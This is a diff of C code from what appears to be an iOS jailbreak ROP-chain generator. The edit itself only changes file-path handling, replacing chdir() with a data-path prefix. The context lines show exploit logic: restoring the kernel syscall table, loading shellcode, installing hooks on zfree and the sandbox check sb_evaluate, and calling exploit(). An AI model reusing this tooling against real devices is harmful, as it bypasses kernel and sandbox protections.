@@ -36,6 +36,7 @@ Addr varsBaseAddr;
 unsigned int varsWritten;
 
 FILE* outFile;
+char dataPath[1024];
 
 short fsgetPadding(unsigned char data) {
 	int i, v = 1;
@@ -547,9 +548,11 @@ void bootstrap()
 
 	// - syscalls table restore (generated at ROP compile time)
 	FILE* f;
+	char fileName[1024];
 	unsigned int j;
 	unsigned int sysentRestore[0x80];
-	f = fopen("sysent_1c50", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/sysent_1c50", dataPath);
+	f = fopen(fileName, "rb");
 	fread(&sysentRestore[0], 4, 0x80, f);
 	fclose(f);
 	for (j = 0; j < 0x80; j++) {
@@ -565,7 +568,8 @@ void bootstrap()
 	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x1f8 - 4, sysentRestore[0x1f8 >> 2]);
 
 	// zfree hooker
-	f = fopen("zfreehooker.bin", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/zfreehooker.bin", dataPath);
+	f = fopen(fileName, "rb");
         fseek(f, 0, SEEK_END);
         int len = ftell(f);
         fseek(f, 0, SEEK_SET);
@@ -578,7 +582,8 @@ void bootstrap()
 	}
 
 	// zfree hook
-	f = fopen("zfreehook.bin", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/zfreehook.bin", dataPath);
+	f = fopen(fileName, "rb");
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
@@ -598,7 +603,8 @@ void bootstrap()
 	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
 
 	// shellcode copy
-	f = fopen("shellcode.bin", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/shellcode.bin", dataPath);
+	f = fopen(fileName, "rb");
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
@@ -611,7 +617,8 @@ void bootstrap()
 	}
 
 	// sb_evaluate hooker
-	f = fopen("sb_evaluatehooker.bin", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehooker.bin", dataPath);
+	f = fopen(fileName, "rb");
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
@@ -624,7 +631,8 @@ void bootstrap()
 	}
 
 	// sb_evaluate hook
-	f = fopen("sb_evaluatehook.bin", "rb");
+	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehook.bin", dataPath);
+	f = fopen(fileName, "rb");
         fseek(f, 0, SEEK_END);
         len = ftell(f);
         fseek(f, 0, SEEK_SET);
@@ -1056,13 +1064,7 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
 
         offsets = global_offsets[firmware][device];
 
-	char prevdir[1024];
-	prevdir[0] = '\0';
-	getcwd(prevdir, 1024);
-
-        char path[1024];
-        snprintf(path, sizeof(path), "data/%s/%s/fsgen", firmwareName, deviceName);
-        chdir(path);
+        snprintf(dataPath, sizeof(dataPath), "data/%s/%s/fsgen", firmwareName, deviceName);
 
 	ropOpen();
 
@@ -1074,8 +1076,6 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
             exploit();
 
 	ropClose();
-
-	chdir(prevdir);
 
         return 0;
 }
